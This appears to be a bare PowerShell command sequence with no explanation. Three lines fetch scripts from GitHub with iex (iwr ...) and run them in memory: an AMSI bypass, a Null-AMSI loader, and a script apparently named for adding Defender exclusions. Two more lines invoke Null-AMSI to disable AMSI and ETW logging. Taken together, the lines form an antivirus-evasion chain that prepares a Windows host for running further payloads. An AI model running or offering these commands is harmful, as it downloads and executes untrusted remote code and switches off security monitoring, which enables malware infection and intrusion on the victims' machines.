iex (iwr -UseBasicParsing "https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/bypass-amsi.ps1")
iex (iwr -UseBasicParsing "https://raw.githubusercontent.com/BlackShell256/Null-AMSI/refs/heads/main/Null-4MSI.ps1")
Invoke-NullAMSI -etw
Invoke-NullAMSI -v
iex (iwr -UseBasicParsing "https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/exclusion.ps1")
